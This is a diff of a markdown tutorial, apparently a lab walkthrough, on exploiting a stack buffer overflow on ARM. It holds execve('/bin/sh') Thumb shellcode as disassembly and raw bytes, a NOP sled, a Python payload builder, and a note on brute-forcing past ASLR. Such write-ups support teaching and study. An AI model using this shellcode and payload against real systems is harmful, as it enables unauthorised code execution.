@@ -102,8 +102,7 @@ here:
 
 I will show both attempts. Keep reading...
 First task while crafting payload would be to construct 
-shellcode (not GAS conform, it's an excerpts from 
-radare output):
+shellcode. Following snippet is an excerpt from radare2's disassembly view of the 16-bit shellcode listed below (Not GNU-Assembler conform syntax):
 
 ```
 adr r0, 8
@@ -114,8 +113,8 @@ movs r7, 0xb
 svc 1
 .string "/bin/shA" ; len=8 
 ```
-Let's set a breakpoint at last instruction in 
-```main```'s epilogue and determine adress of our 
+Let's use snippet below and set a breakpoint at last instruction in 
+```main```'s epilogue and determine address of our 
 payload on stack. 
 
 ```python
@@ -131,6 +130,12 @@ offset=68
 shellcode=b"\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"
 
 nopsled=b"\x2d\x46"*512
-payload = "A"*offset+p(0x7efff6c8+1)+nopsled+shellcode
+payload = "A"*offset+p(0x42424242)+nopsled+shellcode
 print(payload)
 ``` 
+
+By the way: i used the approach to first write junk on stack and nopsled/shellcode after it. As en effect there's no restriction on length of buffer we provide. ALSR is deactivated this time, but if it was not, it would be useful to provide large enough buffer for using brute-force attempts for jumping into our own buffer later on.
+
+```
+
+```
